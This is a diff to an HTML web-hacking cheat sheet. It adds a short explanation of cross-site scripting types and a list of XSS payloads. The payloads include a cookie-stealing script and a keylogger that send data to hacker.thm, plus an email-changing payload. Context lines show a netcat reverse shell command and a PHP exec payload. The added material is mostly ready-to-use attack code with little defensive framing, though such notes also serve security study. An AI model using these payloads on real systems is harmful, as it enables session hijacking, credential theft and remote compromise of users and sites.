@@ -134,7 +134,18 @@
      To exploit it try to inject payload on parameters or redirect to another site work exploit it. "&x=" use to bypass logical parameters.<br>
      if '/' not work then use x/. 
     </p>
-
+    <h2><li>Cross Site Scripting (XSS)</li></h2>
+    <p>
+     
+Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.<br>
+      Three types of XSS exists - 
+      <b>
+      <ul>Reflected XSS </ul>
+      <ol>Stored XSS </ol>
+      <ol>DOM Based XSS </ol>
+      <ol>Blind XSS </ol>
+      </b>
+    </p>
   </div>
             <!--  Vulnerability Finding section end here    -->
 
@@ -207,6 +218,23 @@ nc -e /bin/sh 10.20.14 8080<br>
     Then give this file url as a payload with '?' at the end of the payload.<br><br>
     To execute command and see output use <pre> &lt;?php print exec('[cmd]');?&gt;</pre>
     </p>
+
+    <h2><li>Cross Site Scripting (XSS) exploitation</li></h2>
+    <h3>Some common XSS payload -</h3>
+    <P>
+      <b>Proof Of Concept:</b><br>
+      <pre>&lt;script&gt;alert('XSS');&lt;/script&gt; </pre>
+
+      <b>Session Stealing:</b><br>
+      <pre>&lt;script&gt;fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));&lt;/script&gt;</pre>
+
+      <b>Key Logger:</b>
+      <pre>&lt;script&gt;document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}&lt;/script&gt;</pre>
+
+      <b>Business Logic:</b>
+      <pre>&lt;script&gt;user.changeEmail('attacker@hacker.thm');&lt;/script&gt;</pre>
+
+    </P>
 </div>
    <!-- Exploitation section end here  -->
 </body>
